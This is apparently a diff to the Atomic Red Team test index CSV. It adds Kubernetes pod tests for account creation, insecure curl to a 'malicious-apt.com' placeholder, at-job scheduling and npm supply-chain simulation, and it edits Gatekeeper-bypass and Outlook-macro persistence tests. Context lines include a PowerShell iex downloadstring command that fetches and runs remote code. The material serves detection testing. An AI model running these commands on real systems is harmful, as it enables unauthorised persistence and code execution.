@@ -497,6 +497,33 @@ input_arguments.password.default: T1136_pass
 "
 T1136.001,Create Account: Local Account,Create a new Windows admin user via .NET,2170d9b5-bacd-4819-a952-da76dae0815f,"Creates a new admin user in a powershell session without using net.exe
 ",windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),powershell,True,,,,,
+T1136.001,Create Account: Local Account,Create a Linux user via kubectl in a Pod,d9efa6c7-6518-42b2-809a-4f2a8e242b9b,"Launches a short-lived Alpine pod and creates a Linux user inside the pod.
+The pod is automatically deleted after execution.
+",containers,,,"kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'
+",bash,False,,,,"dependencies.0.description: kubectl must be installed and configured
+dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""
+
+dependencies.0.prereq_command: which kubectl
+
+","input_arguments.pod_name.description: K8s pod_name to execute the command in
+
+input_arguments.pod_name.type: string
+
+input_arguments.pod_name.default: atomic-linux-useradd
+
+input_arguments.username.description: Username of the user to create inside the pod
+
+input_arguments.username.type: string
+
+input_arguments.username.default: evil_user
+
+input_arguments.image_name.description: Name of the docker image
+
+input_arguments.image_name.type: string
+
+input_arguments.image_name.default: alpine
+
+"
 T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - FreeBSD/Linux/macOS,562d737f-2fc6-4b09-8c2a-7f8ff0828480,"Delete a single file from the temporary directory
 ",linux,macos,,"rm -f #{file_to_delete}
 ",sh,,,"rm -rf #{parent_folder}
@@ -11982,6 +12009,32 @@ input_arguments.onedrive_path.type: path
 input_arguments.onedrive_path.default: C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
 
 "
+T1105,Ingress Tool Transfer,Curl Insecure Connection from a Pod,7e2ad0db-1efa-4af2-a77c-bc6e87d7b3f3,"Launches an Ubuntu pod, installs curl, and executes curl with insecure flags (-k/--insecure)
+against a target URL. The pod is automatically deleted after execution.
+",containers,,,kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url},bash,False,,,,"dependencies.0.description: kubectl must be installed and configured
+dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""
+
+dependencies.0.prereq_command: which kubectl
+
+","input_arguments.pod_name.description: K8s pod_name to execute the command in
+
+input_arguments.pod_name.type: string
+
+input_arguments.pod_name.default: atomic-insecure-curl
+
+input_arguments.remote_url.description: Remote URL to curl
+
+input_arguments.remote_url.type: string
+
+input_arguments.remote_url.default: https://malicious-apt.com
+
+input_arguments.image_name.description: Name of the docker image
+
+input_arguments.image_name.type: string
+
+input_arguments.image_name.default: curlimages/curl
+
+"
 T1119,Automated Collection,Automated Collection Command Prompt,cb379146-53f1-43e0-b884-7ce2c635ff5b,"Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection
 to see what was collected.
 ",windows,,,"mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
@@ -12628,8 +12681,8 @@ input_arguments.rsp_file_path.default: PathToAtomicsFolder\T1218.008\bin\
 
 "
 T1553.001,Subvert Trust Controls: Gatekeeper Bypass,Gatekeeper Bypass,fb3d46c6-9480-4803-8d7d-ce676e1f1a9b,"Gatekeeper Bypass via command line
-",macos,,,"sudo xattr -d com.apple.quarantine #{app_path}
-",sh,True,,,,,"input_arguments.app_path.description: Path to app to be used
+",macos,,,"xattr -d com.apple.quarantine #{app_path}
+",sh,,,,,,"input_arguments.app_path.description: Path to app to be used
 
 input_arguments.app_path.type: path
 
@@ -18713,6 +18766,39 @@ input_arguments.at_command.type: string
 input_arguments.at_command.default: echo Hello from Atomic Red Team
 
 "
+T1053.002,Scheduled Task/Job: At,At - Schedule a job via kubectl in a Pod,9ddf2e5e-7e2c-46c2-9940-3c2ff29c7213,"Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon,
+and submits a job with `at`. The pod is deleted after execution.
+",containers,,,"kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '#{at_command}' | at #{time_spec} && at -l""
+",bash,False,,,,"dependencies.0.description: kubectl must be installed and configured
+dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""
+
+dependencies.0.prereq_command: which kubectl
+
+","input_arguments.image_name.description: Name of the image
+
+input_arguments.image_name.type: string
+
+input_arguments.image_name.default: ubuntu
+
+input_arguments.pod_name.description: K8s pod name to execute the command in
+
+input_arguments.pod_name.type: string
+
+input_arguments.pod_name.default: atomic-at-schedule
+
+input_arguments.time_spec.description: Time specification of when the command should run
+
+input_arguments.time_spec.type: string
+
+input_arguments.time_spec.default: now + 1 minute
+
+input_arguments.at_command.description: The command to be run
+
+input_arguments.at_command.type: string
+
+input_arguments.at_command.default: echo Hello from Atomic Red Team
+
+"
 T1049,System Network Connections Discovery,System Network Connections Discovery,0940a971-809a-48f1-9c4d-b1d785e96ee5,"Get a listing of network connections.
 
 Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.
@@ -19420,12 +19506,12 @@ xclip -o > history.txt
 T1137,Office Application Startup,Office Application Startup - Outlook as a C2,bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c,"As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ 
 it is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.
 Too achieve this two things must happened on the syste
-- The macro security registry value must be set to '4'
+- The macro security registry value must be set to '1'
 - A file called VbaProject.OTM must be created in the Outlook Folder.
-",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /t REG_DWORD /d 1 /f
+",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /t REG_DWORD /d 1 /f
 mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
 echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
-",command_prompt,,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /f >nul 2>&1
+",command_prompt,,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /f >nul 2>&1
 del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
 ",,,
 T1542.001,Pre-OS Boot: System Firmware,UEFI Persistence via Wpbbin.exe File Creation,b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1,"Creates Wpbbin.exe in %systemroot%. This technique can be used for UEFI-based pre-OS boot persistence mechanisms.
@@ -22238,6 +22324,30 @@ Upon execution, the user shouldn't be able to access the event log channel via t
 input_arguments.CustomSDPath.default: HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System
 
 input_arguments.CustomSDPath.description: Path to the event log service channel to alter
+
+"
+T1195.002,Compromise Software Supply Chain,Simulate npm package installation on a Linux system,a9604672-cd46-493b-b58f-fd4124c22dd3,"Launches a short‑lived Kubernetes pod using the Node 18 image, initializes a minimal npm project in /tmp/test, and installs the specified npm package without audit/fund/package‑lock options, simulating potentially suspicious package retrieval (e.g., typosquatting/dependency confusion) from within a container. The pod is deleted after execution.
+",containers,linux,,"kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json""
+",bash,False,,,,"dependencies.0.description: kubectl must be installed and configured
+dependencies.0.get_prereq_command: echo ""kubectl must be installed""
+dependencies.0.prereq_command: which kubectl
+","input_arguments.image_name.description: Name of the image
+
+input_arguments.image_name.type: string
+
+input_arguments.image_name.default: node:18
+
+input_arguments.pod_name.description: Name of the pod
+
+input_arguments.pod_name.type: string
+
+input_arguments.pod_name.default: atomic-npm-install
+
+input_arguments.package_name.description: NPM package to install
+
+input_arguments.package_name.type: string
+
+input_arguments.package_name.default: tinycolor
 
 "
 T1648,Serverless Execution,Lambda Function Hijack,87a4a141-c2bb-49d1-a604-8679082d8b91,"Modify an existing Lambda function to execute arbitrary code.
